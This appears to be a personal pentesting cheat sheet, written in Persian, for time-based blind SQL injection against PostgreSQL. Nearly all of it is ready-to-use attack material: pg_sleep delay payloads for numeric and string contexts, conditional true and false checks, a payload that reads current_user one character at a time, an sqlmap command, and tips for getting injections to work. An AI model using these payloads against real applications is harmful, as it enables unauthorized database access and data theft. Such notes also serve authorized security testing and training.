---
tags: [web, sqli, time-based, postgresql]
---

# PostgreSQL Time-Based

## تأخیر ساده

```sql
AND (SELECT 1 FROM pg_sleep(5))=1--
```

در Context رشته‌ای:

```sql
' AND (SELECT 1 FROM pg_sleep(5))=1--
```

## تأخیر شرطی

```sql
AND (SELECT CASE WHEN (1=1) THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)=1--
```

کنترل False:

```sql
AND (SELECT CASE WHEN (1=2) THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)=1--
```

## نمونه شرط روی کاراکتر

```sql
AND (SELECT CASE
  WHEN ASCII(SUBSTRING(current_user,1,1))>100
  THEN (SELECT 1 FROM pg_sleep(5))
  ELSE 1
END)=1--
```

## sqlmap

```bash
sqlmap -r request.txt -p id \
  --dbms=PostgreSQL --technique=T --time-sec=5 --batch
```

## نکات

- از `pg_sleep` در عبارتی استفاده کن که با نوع داده و ساختار Query سازگار باشد.
- اگر Comment `--` کار نکرد، پایان Query و نیاز به فضای بعد از آن را بررسی کن.
- اجرای Stack Query در همه Driverها ممکن نیست؛ به تأخیرهای مبتنی بر عبارت تکی اعتماد بیشتری داشته باش.

## یادداشت Context من

```text
Parameter:
Working prefix:
Working suffix:
Delay observed:
Control result:
```
